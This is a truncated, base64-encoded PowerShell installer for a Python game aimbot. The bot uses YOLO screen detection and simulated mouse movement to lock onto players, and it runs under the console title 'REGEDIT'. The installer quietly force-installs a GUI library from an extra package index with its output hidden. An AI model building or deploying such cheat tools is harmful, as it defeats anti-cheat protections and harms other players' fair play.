VzdC1BZG1pbiB7DQogICAgJGlkZW50aXR5ID0gW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkNCiAgICAkcHJpbmNpcGFsID0gTmV3LU9iamVjdCBTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbCgkaWRlbnRpdHkpDQogICAgcmV0dXJuICRwcmluY2lwYWwuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KfQ0KDQpmdW5jdGlvbiBJbnN0YWxsLVBhY2thZ2VzIHsNCiAgICAkcGFja2FnZXMgPSBAKA0KICAgICAgICAidWx0cmFseXRpY3MiLA0KICAgICAgICAibXNzIiwNCiAgICAgICAgInB5YXV0b2d1aSIsDQogICAgICAgICJvcGVuY3YtcHl0aG9uIiwNCiAgICAgICAgInB5d2luMzIiDQogICAgKQ0KICAgIA0KICAgIFdyaXRlLUhvc3QgIlsrXSBDaGVja2luZyBQeXRob24gcGFja2FnZXMuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgQ3lhbg0KICAgIA0KICAgICMgQ2hlY2sgaWYgcGlwIGlzIGF2YWlsYWJsZQ0KICAgIHRyeSB7IA0KICAgICAgICAkbnVsbCA9ICYgcHl0aG9uIC1tIHBpcCAtLXZlcnNpb24gDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiWy1dIHBpcCBub3QgZm91bmQuIEluc3RhbGxpbmcgcGlwLi4uIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAmIHB5dGhvbiAtbSBlbnN1cmVwaXAgLS1kZWZhdWx0LXBpcA0KICAgIH0NCiAgICANCiAgICAjIFNwZWNpYWwgUHlTaW1wbGVHVUkgaW5zdGFsbGF0aW9uIGZpcnN0DQogICAgV3JpdGUtSG9zdCAiICAtIEluc3RhbGxpbmcgUHlTaW1wbGVHVUkgZnJvbSBwcml2YXRlIHNlcnZlci4uLiIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cNCiAgICAmIHB5dGhvbiAtbSBwaXAgdW5pbnN0YWxsIFB5U2ltcGxlR1VJIC15IDI+JjEgfCBPdXQtTnVsbA0KICAgICYgcHl0aG9uIC1tIHBpcCBjYWNoZSBwdXJnZSAyPiYxIHwgT3V0LU51bGwNCiAgICAmIHB5dGhvbiAtbSBwaXAgaW5zdGFsbCAtLWZvcmNlLXJlaW5zdGFsbCAtLWV4dHJhLWluZGV4LXVybCBodHRwczovL1B5U2ltcGxlR1VJLm5ldC9pbnN0YWxsIFB5U2ltcGxlR1VJIDI+JjEgfCBPdXQtTnVsbA0KICAgIA0KICAgIGZvcmVhY2ggKCRwa2cgaW4gJHBhY2thZ2VzKSB7DQogICAgICAgIFdyaXRlLUhvc3QgIiAgLSBDaGVja2luZyAkcGtnLi4uIiAtTm9OZXdsaW5lDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkaW5zdGFsbGVkID0gJiBweXRob24gLWMgImltcG9ydCAkcGtnIiAyPiYxDQogICAgICAgICAgICBpZiAoJExBU1RFWElUQ09ERSAtZXEgMCkgew0KICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgIiBPSyIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICB0aHJvdw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgIFdyaXRlLUhvc3QgIiBJbnN0YWxsaW5nLi4uIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAgICAgJiBweXRob24gLW0gcGlwIGluc3RhbGwgJHBrZyAtLXF1aWV0IC0tZGlzYWJsZS1waXAtdmVyc2lvbi1jaGVjaw0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LU1vZGVsIHsNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRtb2RlbEZpbGUpKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIA0KICAgIHRyeSB7DQogICAgICAgICRoYXNoID0gKEdldC1GaWxlSGFzaCAtQWxnb3JpdGhtIFNIQTI1NiAtUGF0aCAkbW9kZWxGaWxlKS5IYXNoDQogICAgICAgIHJldHVybiAkaGFzaCAtZXEgJG1vZGVsSGFzaA0KICAgIH0NCiAgICBjYXRjaCB7IHJldHVybiAkZmFsc2UgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtTW9kZWwgew0KICAgIFdyaXRlLUhvc3QgIlsrXSBEb3dubG9hZGluZyBtb2RlbC4uLiIgLUZvcmVncm91bmRDb2xvciBDeWFuDQogICAgdHJ5IHsNCiAgICAgICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkbW9kZWxVcmwgLU91dEZpbGUgJG1vZGVsRmlsZSAtVXNlQmFzaWNQYXJzaW5nDQogICAgICAgIGlmICgtbm90IChUZXN0LU1vZGVsKSkgew0KICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gJG1vZGVsRmlsZSAtRm9yY2UNCiAgICAgICAgICAgIHRocm93ICJNb2RlbCB2ZXJpZmljYXRpb24gZmFpbGVkIChIYXNoIG1pc21hdGNoKSINCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHRydWUNCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gRXJyb3IgZG93bmxvYWRpbmcgbW9kZWw6ICRfIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDcmVhdGUtUHl0aG9uU2NyaXB0IHsNCiAgICBAJw0KIyBTQUdFeCBSRUdFRElUIFYyLjEgDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCBjdjINCmltcG9ydCB0aW1lDQppbXBvcnQgY3R5cGVzDQppbXBvcnQgcHlhdXRvZ3VpDQppbXBvcnQgbnVtcHkgYXMgbnANCmltcG9ydCBtc3MNCmltcG9ydCBsb2dnaW5nDQppbXBvcnQgUHlTaW1wbGVHVUkgYXMgc2cNCmZyb20gdWx0cmFseXRpY3MgaW1wb3J0IFlPTE8NCmltcG9ydCB3aW4zMmFwaQ0KaW1wb3J0IHdpbjMyY29uDQppbXBvcnQgd2luc291bmQNCg0KIyBDb25maWd1cmF0aW9uDQpERUZBVUxUX0NPTkZJRyA9IHsNCiAgICAiY29uZmlkZW5jZSI6IDAuNSwNCiAgICAic21vb3RobmVzcyI6IDAuMzUsDQogICAgInNjYW5faW50ZXJ2YWwiOiAwLjAyLA0KICAgICJkcmFnX2RlbGF5IjogMC4wMjAsDQogICAgInJlZ2lvbl9zaXplIjogNDAwLA0KICAgICJlbmFibGVfc291bmQiOiBUcnVlLA0KICAgICJkYXNoX2tleSI6ICJWS19TSElGVCIsDQogICAgImRhc2hfZHVyYXRpb24iOiAwLjIsDQogICAgImRhc2hfY29vbGRvd24iOiAyLjANCn0NCg0KIyBBdmFpbGFibGUgZGFzaCBrZXlzDQpEQVNIX0tFWVMgPSB7DQogICAgIlZLX1NISUZUIjogd2luMzJjb24uVktfU0hJRlQsDQogICAgIlZLX1NQQUNFIjogd2luMzJjb24uVktfU1BBQ0UsDQogICAgIlZLX0NBUElUQUwiOiB3aW4zMmNvbi5WS19DQVBJVEFMDQp9DQoNCiMgU291bmQgZnJlcXVlbmNpZXMNClNPVU5EUyA9IHsNCiAgICAidG9nZ2xlX29uIjogNzg0LA0KICAgICJ0b2dnbGVfb2ZmIjogNTIzLA0KICAgICJ0YXJnZXRfbG9ja2VkIjogNjU5LA0KICAgICJkYXNoX2FjdGl2YXRlZCI6IDk4OCwNCiAgICAiZXJyb3IiOiAzOTINCn0NCg0KIyBJbml0aWFsaXplDQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLlNldENvbnNvbGVUaXRsZVcoIlNBR0V4IFJFR0VESVQgVjIuMSIpDQpsb2dnaW5nLmdldExvZ2dlcigidWx0cmFseXRpY3MiKS5zZXRMZXZlbChsb2dnaW5nLkNSSVRJQ0FMKQ0KcHlhdXRvZ3VpLkZBSUxTQUZFID0gRmFsc2UNCg0KY2xhc3MgQWltYm90Q29uZmlnOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5hY3RpdmUgPSBGYWxzZQ0KICAgICAgICBzZWxmLmNvbmZpZGVuY2UgPSBmbG9hdChERUZBVUxUX0NPTkZJR1siY29uZmlkZW5jZSJdKQ0KICAgICAgICBzZWxmLnNtb290aG5lc3MgPSBmbG9hdChERUZBVUxUX0NPTkZJR1sic21vb3RobmVzcyJdKQ0KICAgICAgICBzZWxmLnNjYW5faW50ZXJ2YWwgPSBmbG9hdChERUZBVUxUX0NPTkZJR1sic2Nhbl9pbnRlcnZhbCJdKQ0KICAgICAgICBzZWxmLmRyYWdfZGVsYXkgPSBmbG9hdChERUZBVUxUX0NPTkZJR1siZHJhZ19kZWxheSJdKQ0KICAgICAgICBzZWxmLnJlZ2lvbl9zaXplID0gaW50KERFRkFVTFRfQ09ORklHWyJyZWdpb25fc2l6ZSJdKQ0KICAgICAgICBzZWxmLmVuYWJsZV9zb3VuZCA9IGJvb2woREVGQVVMVF9DT05GSUdbImVuYWJsZV9zb3VuZCJdKQ0KICAgICAgICBzZWxmLmRhc2hfa2V5ID0gc3RyKERFRkFVTFRfQ09ORklHWyJkYXNoX2tleSJdKQ0KICAgICAgICBzZWxmLmRhc2hfZHVyYXRpb24gPSBmbG9hdChERUZBVUxUX0NPTkZJR1siZGFzaF9kdXJhdGlvbiJdKQ0KICAgICAgICBzZWxmLmRhc2hfY29vbGRvd24gPSBmbG9hdChERUZBVUxUX0NPTkZJR1siZGFzaF9jb29sZG93biJdKQ0KICAgICAgICBzZWxmLmxhc3RfZGFzaF90aW1lID0gMA0KICAgICAgICBzZWxmLnVwZGF0ZV9zY3JlZW5fcGFyYW1zKCkNCiAgICAgICAgDQogICAgZGVmIHVwZGF0ZV9zY3JlZW5fcGFyYW1zKHNlbGYpOg0KICAgICAgICBzZWxmLnNjcmVlbl93aWR0aCwgc2VsZi5zY3JlZW5faGVpZ2h0ID0gcHlhdXRvZ3VpLnNpemUoKQ0KICAgICAgICBzZWxmLnJlZ2lvbl9sZWZ0ID0gaW50KHNlbGYuc2NyZWVuX3dpZHRoIC8vIDIgLSBzZWxmLnJlZ2lvbl9zaXplIC8vIDIpDQogICAgICAgIHNlbGYucmVnaW9uX3RvcCA9IGludChzZWxmLnNjcmVlbl9oZWlnaHQgLy8gMiAtIHNlbGYucmVnaW9uX3NpemUgLy8gMikNCiAgICAgICAgc2VsZi5zY3JlZW5fcmVnaW9uID0gew0KICAgICAgICAgICAgInRvcCI6IHNlbGYucmVnaW9uX3RvcCwNCiAgICAgICAgICAgICJsZWZ0Ijogc2VsZi5yZWdpb25fbGVmdCwNCiAgICAgICAgICAgICJ3aWR0aCI6IHNlbGYucmVnaW9uX3NpemUsDQogICAgICAgICAgICAiaGVpZ2h0Ijogc2VsZi5yZWdpb25fc2l6ZQ0KICAgICAgICB9DQogICAgDQogICAgZGVmIHBsYXlfc291bmQoc2VsZiwgc291bmRfdHlwZSk6DQogICAgICAgIGlmIHNlbGYuZW5hYmxlX3NvdW5kIGFuZCBzb3VuZF90eXBlIGluIFNPVU5EUzoNCiAgICAgICAgICAgIHdpbnNvdW5kLkJlZXAoU09VTkRTW3NvdW5kX3R5cGVdLCAxNTApDQoNCmRlZiBjcmVhdGVfZ3VpKGNvbmZpZyk6DQogICAgc2cudGhlbWUoJ0RhcmtHcmV5NScpDQogICAgDQogICAgZGFzaF9rZXlfb3B0aW9ucyA9IGxpc3QoREFTSF9LRVlTLmtleXMoKSkNCiAgICANCiAgICBsYXlvdXQgPSBbDQogICAgICAgIFtzZy5UZXh0KCJTQUdFeCBSRUdFRElUIFYyLjEgLSBGaXhlZCIsIGZvbnQ9KCdIZWx2ZXRpY2EnLCAxNikpXSwNCiAgICAgICAgW3NnLkhvcml6b250YWxTZXBhcmF0b3IoKV0sDQogICAgICAgIFsNCiAgICAgICAgICAgIHNnLkNvbHVtbihbDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIkNvbmZpZGVuY2UgVGhyZXNob2xkOiIsIHNpemU9KDIwLDEpKV0sDQogICAgICAgICAgICAgICAgW3NnLlNsaWRlcigoMC4xLCAwLjkpLCBjb25maWcuY29uZmlkZW5jZSwgMC4wNSwgb3JpZW50YXRpb249J2gnLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAga2V5PSctQ09ORklERU5DRS0nLCBzaXplPSgzMCwxNSkpXSwNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiU21vb3RobmVzczoiLCBzaXplPSgyMCwxKSldLA0KICAgICAgICAgICAgICAgIFtzZy5TbGlkZXIoKDAuMSwgMS4wKSwgY29uZmlnLnNtb290aG5lc3MsIDAuMDUsIG9yaWVudGF0aW9uPSdoJywgDQogICAgICAgICAgICAgICAgICAgICAgICAgIGtleT0nLVNNT09USE5FU1MtJywgc2l6ZT0oMzAsMTUpKV0sDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIlJlZ2lvbiBTaXplOiIsIHNpemU9KDIwLDEpKV0sDQogICAgICAgICAgICAgICAgW3NnLlNsaWRlcigoMTAwLCA1MDApLCBjb25maWcucmVnaW9uX3NpemUsIDEwLCBvcmllbnRhdGlvbj0naCcsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICBrZXk9Jy1SRUdJT04tJywgc2l6ZT0oMzAsMTUpLCBlbmFibGVfZXZlbnRzPVRydWUpXSwNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbc2cuQ2hlY2tib3goIkVuYWJsZSBTb3VuZCIsIGRlZmF1bHQ9Y29uZmlnLmVuYWJsZV9zb3VuZCwga2V5PSctU09VTkQtJyldLA0KICAgICAgICAgICAgXSksDQogICAgICAgICAgICBzZy5WZXJ0aWNhbFNlcGFyYXRvcigpLA0KICAgICAgICAgICAgc2cuQ29sdW1uKFsNCiAgICAgICAgICAgICAgICBbc2cuQnV0dG9uKCJUb2dnbGUgT04vT0ZGIChGNikiLCBzaXplPSgyMCwyKSwga2V5PSctVE9HR0xFLScpXSwNCiAgICAgICAgICAgICAgICBbc2cuQnV0dG9uKCJEYXNoIChGNykiLCBzaXplPSgyMCwyKSwga2V5PSctREFTSC0nKV0sDQogICAgICAgICAgICAgICAgW3NnLkJ1dHRvbigiRXhpdCAoRjgpIiwgc2l6ZT0oMjAsMiksIGtleT0nLUVYSVQtJyldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJTdGF0dXM6Iiwgc2l6ZT0oMjAsMSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiSU5BQ1RJVkUiLCBrZXk9Jy1TVEFUVVMtJywgdGV4dF9jb2xvcj0ncmVkJywgc2l6ZT0oMjAsMSksIA0KICAgICAgICAgICAgICAgICAgICAgICAgZm9udD0oJ0hlbHZldGljYScsIDEyKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJEYXNoIENvb2xkb3duOiIsIHNpemU9KDIwLDEpKV0sDQogICAgICAgICAgICAgICAgW3NnLlByb2dyZXNzQmFyKDEwMCwgb3JpZW50YXRpb249J2gnLCBzaXplPSgyMCwxMCksIGtleT0nLURBU0hDT09MRE9XTi0nKV0sDQogICAgICAgICAgICBdKQ0KICAgICAgICBdLA0KICAgICAgICBbc2cuSG9yaXpvbnRhbFNlcGFyYXRvcigpXSwNCiAgICAgICAgWw0KICAgICAgICAgICAgc2cuQ29sdW1uKFsNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiRGFzaCBTZXR0aW5ncyIsIGZvbnQ9KCdIZWx2ZXRpY2EnLCAxMikpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiRGFzaCBLZXk6Iiwgc2l6ZT0oMTIsMSkpLCANCiAgICAgICAgICAgICAgICAgc2cuQ29tYm8oZGFzaF9rZXlfb3B0aW9ucywgZGVmYXVsdF92YWx1ZT1jb25maWcuZGFzaF9rZXksIGtleT0nLURBU0hLRVktJyldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJEdXJhdGlvbiAocyk6Iiwgc2l6ZT0oMTIsMSkpLA0KICAgICAgICAgICAgICAgICBzZy5TbGlkZXIoKDAuMSwgMS4wKSwgY29uZmlnLmRhc2hfZHVyYXRpb24sIDAuMSwgb3JpZW50YXRpb249J2gnLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAga2V5PSctREFTSERVUkFUSU9OLScsIHNpemU9KDE1LDE1KSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJDb29sZG93biAocyk6Iiwgc2l6ZT0oMTIsMSkpLA0KICAgICAgICAgICAgICAgICBzZy5TbGlkZXIoKDAuNSwgNS4wKSwgY29uZmlnLmRhc2hfY29vbGRvd24sIDAuMSwgb3JpZW50YXRpb249J2gnLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAga2V5PSctREFTSENPT0xET1dOX1NMSURFUi0nLCBzaXplPSgxNSwxNSkpXSwNCiAgICAgICAgICAgIF0pLA0KICAgICAgICAgICAgc2cuVmVydGljYWxTZXBhcmF0b3IoKSwNCiAgICAgICAgICAgIHNnLkNvbHVtbihbDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIkhvdGtleXM6IiwgZm9udD0oJ0hlbHZldGljYScsIDEyKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJGNjogVG9nZ2xlIEFpbWJvdCIsIHNpemU9KDIwLDEpKV0sDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIkY3OiBEYXNoIiwgc2l6ZT0oMjAsMSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiRjg6IEV4aXQgUHJvZ3JhbSIsIHNpemU9KDIwLDEpKV0sDQogICAgICAgICAgICAgICAgW3NnLlRleHQoIkxNQjogSG9sZCB0byBBaW0iLCBzaXplPSgyMCwxKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJDVFJMOiBRdWljayBEYXNoIiwgc2l6ZT0oMjAsMSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiIiwgc2l6ZT0oMjAsMSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiU291bmRzOiIsIGZvbnQ9KCdIZWx2ZXRpY2EnLCAxMikpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiSGlnaDogRHJhZyBBc3Npc3QgT24iLCBzaXplPSgyMCwxKSldLA0KICAgICAgICAgICAgICAgIFtzZy5UZXh0KCJNZWRpdW06IFRhcmdldCBMb2NrIiwgc2l6ZT0oMjAsMSkpXSwNCiAgICAgICAgICAgICAgICBbc2cuVGV4dCgiTG93OiBEcmFnIEFzc2lzdCBPZmYiLCBzaXplPSgyMCwxKSldLA0KICAgICAgICAgICAgXSkNCiAgICAgICAgXQ0KICAgIF0NCiAgICANCiAgICB3aW5kb3cgPSBzZy5XaW5kb3coIlNBR0V4IFJFR0VESVQgVjIuMSBDT05UUk9MIFBBTkVMIiwgbGF5b3V0LCBmaW5hbGl6ZT1UcnVlKQ0KICAgIHJldHVybiB3aW5kb3cNCg0KZGVmIGlzX3ByZXNzZWQoayk6IA0KICAgIHJldHVybiB3aW4zMmFwaS5HZXRBc3luY0tleVN0YXRlKGspICYgMHg4MDAwDQoNCmRlZiBsbWJfaGVsZCgpOiANCiAgICByZXR1cm4gaXNfcHJlc3NlZCh3aW4zMmNvbi5WS19MQlVUVE9OKQ0KDQpkZWYgcm1iX2hlbGQoKTogDQogICAgcmV0dXJuIGlzX3ByZXNzZWQod2luMzJjb24uVktfUkJVVFRPTikNCg0KZGVmIG1vdmVfdmlydHVhbCh4LCB5KTogDQogICAgY3R5cGVzLndpbmRsbC51c2VyMzIubW91c2VfZXZlbnQoMHgwMDAxLCBpbnQoeCksIGludCh5KSwgMCwgMCkNCg0KZGVmIGRldGVjdF9lbmVteShjb25maWcsIG1vZGVsKToNCiAgICB0cnk6DQogICAgICAgIHJlZ2lvbiA9IHsNCiAgICAgICAgICAgICJ0b3AiOiBpbnQoY29uZmlnLnNjcmVlbl9yZWdpb25bInRvcCJdKSwNCiAgICAgICAgICAgICJsZWZ0IjogaW50KGNvbmZpZy5zY3JlZW5fcmVnaW9uWyJsZWZ0Il0pLA0KICAgICAgICAgICAgIndpZHRoIjogaW50KGNvbmZpZy5zY3JlZW5fcmVnaW9uWyJ3aWR0aCJdKSwNCiAgICAgICAgICAgICJoZWlnaHQiOiBpbnQoY29uZmlnLnNjcmVlbl9yZWdpb25bImhlaWdodCJdKQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICB3aXRoIG1zcy5tc3MoKSBhcyBzY3Q6DQogICAgICAgICAgICBpbWcgPSBucC5hcnJheShzY3QuZ3JhYihyZWdpb24pKQ0KICAgICAgICAgICAgaW1nID0gY3YyLmN2dENvbG9yKGltZywgY3YyLkNPTE9SX0JHUkEyQkdSKQ0KDQogICAgICAgIHJlc3VsdHMgPSBtb2RlbChpbWcsIGNvbmY9Y29uZmlnLmNvbmZpZGVuY2UsIHZlcmJvc2U9RmFsc2UpDQogICAgICAgIGJveGVzID0gcmVzdWx0c1swXS5ib3hlcy54eXh5LmNwdSgpLm51bXB5KCkNCiAgICAgICAgY2xhc3NlcyA9IHJlc3VsdHNbMF0uYm94ZXMuY2xzLmNwdSgpLm51bXB5KCkNCg0KICAgICAgICBiZXN0X3RhcmdldCA9IE5vbmUNCiAgICAgICAgYmVzdF9jb25mID0gMA0KDQogICAgICAgIGZvciBpLCBib3ggaW4gZW51bWVyYXRlKGJveGVzKToNCiAgICAgICAgICAgIGNsYXNzX2lkID0gaW50KGNsYXNzZXNbaV0pDQogICAgICAgICAgICBpZiBjbGFzc19pZCA9PSAwOiAgIyBQZXJzb24gY2xhc3MNCiAgICAgICAgICAgICAgICB4MSwgeTEsIHgyLCB5MiA9IG1hcChpbnQsIGJveCkNCiAgICAgICAgICAgICAgICBjb25mID0gcmVzdWx0c1swXS5ib3hlcy5jb25mW2ldDQogICAgICAgICAgICAgICAgY3ggPSBjb25maWcucmVnaW9uX2xlZnQgKyAoeDEgKyB4MikgLy8gMg0KICAgICAgICAgICAgICAgIGN5ID0gY29uZmlnLnJlZ2lvbl90b3AgKyBpbnQoeTEgKyAoeTIgLSB5MSkgKiAwLjIpDQogICAgICAgICAgICAgICAgaWYgY29uZiA+IGJlc3RfY29uZjoNCiAgICAgICAgICAgICAgICAgICAgYmVzdF90YXJnZXQgPSAoY3gsIGN5KQ0KICAgICAgICAgICAgICAgICAgICBiZXN0X2NvbmYgPSBjb25mDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICBpZiBiZXN0X3RhcmdldDoNCiAgICAgICAgICAgIGNvbmZpZy5wbGF5X3NvdW5kKCJ0YXJnZXRfbG9ja2VkIikNCiAgICAgICAgICAgIA0KICAgICAgICByZXR1cm4gYmVzdF90YXJnZXQNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KGYiW0VSUk9SXSBEZXRlY3Rpb24gZmFpbGVkOiB7c3RyKGUpfSIpDQogICAgICAgIHJldHVybiBOb25lDQoNCmRlZiBzbW9vdGhfYWltX3RvKGNvbmZpZywgdGFyZ2V0X3gsIHRhcmdldF95KToNCiAgICB0cnk6DQogICAgICAgIGN4LCBjeSA9IHB5YXV0b2d1aS5wb3NpdGlvbigpDQogICAgICAgIGR4ID0gdGFyZ2V0X3ggLSBjeA0KICAgICAgICBkeSA9IHRhcmdldF95IC0gY3kNCiAgICAgICAgc3RlcHMgPSBtYXgoaW50KG5wLmh5cG90KGR4LCBkeSkgLyBtYXgoY29uZmlnLnNtb290aG5lc3MsIDAuMSkgLy8gMS41KSwgMSkNCiAgICAgICAgDQogICAgICAgIGZvciBfIGluIHJhbmdlKHN0ZXBzKToNCiAgICAgICAgICAgIGlmIG5vdCBsbWJfaGVsZCgpOg0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgbXggPSBpbnQoZHggLyBzdGVwcykNCiAgICAgICAgICAgIG15ID0gaW50KGR5IC8gc3RlcHMpDQogICAgICAgICAgICBtb3ZlX3ZpcnR1YWwobXgsIG15KQ0KICAgICAgICAgICAgdGltZS5zbGVlcChtYXgoY29uZmlnLmRyYWdfZGVsYXksIDAuMDEpKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcHJpbnQoZiJbRVJST1JdIEFpbWluZyBmYWlsZWQ6IHtzdHIoZSl9IikNCg0KZGVmIHBlcmZvcm1fZGFzaChjb25maWcpOg0KICAgIGN1cnJlbnRfdGltZSA9IHRpbWUudGltZSgpDQogICAgaWYgY3VycmVudF90aW1lIC0gY29uZmlnLmxhc3RfZGFzaF90aW1lIDwgY29uZmlnLmRhc2hfY29vbGRvd246DQogICAgICAgIHJldHVybiBGYWxzZQ0KICAgICAgICANCiAgICB0cnk6DQogICAgICAgIGtleV9jb2RlID0gREFTSF9LRVlTW2NvbmZpZy5kYXNoX2tleV0NCiAgICAgICAgd2luMzJhcGkua2V5YmRfZXZlbnQoa2V5X2NvZGUsIDAsIDAsIDApDQogICAgICAgIHRpbWUuc2xlZXAoY29uZmlnLmRhc2hfZHVyYXRpb24pDQogICAgICAgIHdpbjMyYXBpLmtleWJkX2V2ZW50KGtleV9jb2RlLCAwLCB3aW4zMmNvbi5LRVlFVkVOVEZfS0VZVVAsIDApDQogICAgICAgIA0KICAgICAgICBjb25maWcubGFzdF9kYXNoX3RpbWUgPSBjdXJyZW50X3RpbWUNCiAgICAgICAgY29uZmlnLnBsYXlfc291bmQoImRhc2hfYWN0aXZhdGVkIikNCiAgICAgICAgcmV0dXJuIFRydWUNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KGYiW0VSUk9SXSBEYXNoIGZhaWxlZDoge3N0cihlKX0iKQ0KICAgICAgICBjb25maWcucGxheV9zb3VuZCgiZXJyb3IiKQ0KICAgICAgICByZXR1cm4gRmFsc2UNCg0KZGVmIG1haW4oKToNCiAgICB0cnk6DQogICAgICAgIGNvbmZpZyA9IEFpbWJvdENvbmZpZygpDQogICAgICAgIG1vZGVsID0gWU9MTygieW9sb3Y4bi5wdCIpDQogICAgICAgIHdpbmRvdyA9IGNyZWF0ZV9ndWkoY29uZmlnKQ0KICAgICAgICBsYXN0X3RvZ2dsZSA9IDANCiAgICAgICAgDQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICBldmVudCwgdmFsdWVzID0gd2luZG93LnJlYWQodGltZW91dD0xMCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgZXZlbnQgPT0gc2cuV0lOX0NMT1NFRCBvciBldmVudCA9PSAnLUVYSVQtJyBvciBpc19wcmVzc2VkKHdpbjMyY29uLlZLX0YxMCk6DQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChldmVudCA9PSAnLVRPR0dMRS0nIG9yIGlzX3ByZXNzZWQod2luMzJjb24uVktfRjYpKSBhbmQgdGltZS50aW1lKCkgLSBsYXN0X3RvZ2dsZSA+IDAuNToNCiAgICAgICAgICAgICAgICBjb25maWcuYWN0aXZlID0gbm90IGNvbmZpZy5hY3RpdmUNCiAgICAgICAgICAgICAgICBzdGF0dXNfdGV4dCA9ICJBQ1RJVkUiIGlmIGNvbmZpZy5hY3RpdmUgZWxzZSAiSU5BQ1RJVkUiDQogICAgICAgICAgICAgICAgc3RhdHVzX2NvbG9yID0gJ2dyZWVuJyBpZiBjb25maWcuYWN0aXZlIGVsc2UgJ3JlZCcNCiAgICAgICAgICAgICAgICB3aW5kb3dbJy1TVEFUVVMtJ10udXBkYXRlKHN0YXR1c190ZXh0LCB0ZXh0X2NvbG9yPXN0YXR1c19jb2xvcikNCiAgICAgICAgICAgICAgICBjb25maWcucGxheV9zb3VuZCgidG9nZ2xlX29uIiBpZiBjb25maWcuYWN0aXZlIGVsc2UgInRvZ2dsZV9vZmYiKQ0KICAgICAgICAgICAgICAgIGxhc3RfdG9nZ2xlID0gdGltZS50aW1lKCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKGV2ZW50ID09ICctREFTSC0nIG9yIGlzX3ByZXNzZWQod2luMzJjb24uVktfRjcpIG9yIGlzX3ByZXNzZWQod2luMzJjb24uVktfQ09OVFJPTCkpIGFuZCB0aW1lLnRpbWUoKSAtIGxhc3RfdG9nZ2xlID4gMC41Og0KICAgICAgICAgICAgICAgIGlmIHBlcmZvcm1fZGFzaChjb25maWcpOg0KICAgICAgICAgICAgICAgICAgICB3aW5kb3dbJy1EQVNIQ09PTERPV04tJ10udXBkYXRlKDApDQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvb2xkb3duX3JlbWFpbmluZyA9IG1heCgwLCBjb25maWcuZGFzaF9jb29sZG93biAtICh0aW1lLnRpbWUoKSAtIGNvbmZpZy5sYXN0X2Rhc2hfdGltZSkpDQogICAgICAgICAgICBjb29sZG93bl9wZXJjZW50ID0gaW50KDEwMCAtIChjb29sZG93bl9yZW1haW5pbmcgLyBjb25maWcuZGFzaF9jb29sZG93biAqIDEwMCkpDQogICAgICAgIC